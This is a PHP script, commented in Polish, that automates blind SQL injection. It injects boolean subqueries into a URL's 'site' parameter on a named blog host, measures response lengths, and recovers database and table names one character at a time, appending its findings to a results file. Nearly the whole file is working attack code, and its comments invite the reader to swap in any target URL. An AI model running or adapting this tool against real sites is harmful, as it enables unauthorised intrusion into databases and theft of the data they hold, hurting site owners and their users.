<?php
/* Skrypt do wyciagania danych przez BLIND SQL Injection
Zmieniaj $url na takie jak potrzebujesz. 

Podane $url w wyciaga nazwy tabel z danej bazy danych:
$url = 'http://blaszczakm.blogspot.com/index.php?site=10%20and%20(select%20count(*)%20from%20INFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_SCHEMA%20%3D%20%20%27lcheart%27%20AND%20TABLE_NAME%20LIKE%20%27###%25%27%20)';

Podane $url pozwala wyszukac nazwe bazych: 
http://blaszczakm.blogspot.com/index.php?site=10%20and%20%28select%20count%28*%29%20from%20INFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_SCHEMA%20LIKE%20%27%a%%27%20%20%29
*/



$acceptableLength = 18172; // poprawna wartosc oznaczajaca ze w bazie jest dana wartosc

// Tablica zawiera wczesniej przygotowane wartosci (jesli znamy).
$preArray = array('lch_');

// Dodalem znaczek ucieczki dla podkreslenia, poniewaz samo podkreslenie w klauzuli LIKE rowna jest dowolnemu znakowi.
$charsArray = array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',0,1,2,3,4,5,6,7,8,9,'_');
//$chars = array('a','n','m','e','w','s');

// Funckja zwraca dlugosc odpowiedzi, nie trzeba wiec dodatkowo trimowac.
function blind($url)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_VERBOSE, false);
	curl_setopt($ch, CURLOPT_NOBODY, false);
	curl_setopt($ch, CURLOPT_HEADER, true);
	curl_setopt($ch, CURLOPT_URL, $url);
	$response = curl_exec($ch);
	return strlen($response);
}

// URL zawiera trzy hashe (###), ktore zostaja zastapione odpowiednim ciagiem.
$url = 'http://blaszczakm.blogspot.com/index.php?site=10%20and%20(select%20count(*)%20from%20INFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_SCHEMA%20%3D%20%20%27lcheart%27%20AND%20TABLE_NAME%20LIKE%20%27###%25%27%20)';

// Jesli mamy znane wczesniej ciagi, to ich uzywamy. Inaczej szukamy kazda litere osobno, czyli korzystamy z tablicy liter jako poczatkowej..
if(!empty($preArray)) {
	$checkArray = $preArray;
}
else {
	$checkArray = $charsArray;
}

// Dlugosc ciagu, ktory dodajemy (== krok petli).
$stringLength = 0;
$foundArray = array();
do
{
	$endWhile = true; // Ustawiamy znacznik zakonczenia petli na pozytywny.
	$stringLength++;
    echo "### String length: " . $stringLength . "\n";
	
	$tempArray = array(); // Zerujemy tablice znalezionych elementow.
	foreach($checkArray as $value) {
		
		$checkLength = blind(str_replace('###', str_replace("_", "\\_", $value), $url));
		if($checkLength == $acceptableLength) { // Znaleziono prawidłową literę.
			echo "### Found: " . $value . "\n";
			$endWhile = false; // Kontynuujemy, jeśli znaleźliśmy cokolwiek.
			$foundStr = $value; // Nasza znaleziona wartość.
			array_push($foundArray, $foundStr); // Zapiszemy sobie dla lepszego podsumowania.
			file_put_contents("results.txt", $foundStr . "\r\n", FILE_APPEND); // Zapisujemy wyniki do pliku na wszelki wypadek i do pozniejszej obrobki.
			foreach($charsArray as $value) {
				array_push($tempArray, $foundStr . $value);
			}
		}
		else {
			echo "... Nope: " . $value . "\n"; // str_replace, zeby wygodniej sie czytalo.
		}
	}
	
	$checkArray = $tempArray; // Nowa tablica do przeszukiwania bedzie nasza tablica ze znalezionymi elementami.
	               
} while (!empty($checkArray));

// Sortujemy wyniki i wyswietlamy. Nie kombinowalem wiecej z usuwaniem nadmiarow.
sort($foundArray);
echo "Found strings:\n";
foreach($foundArray as $value) {
	echo $value . "\n";
}



?>
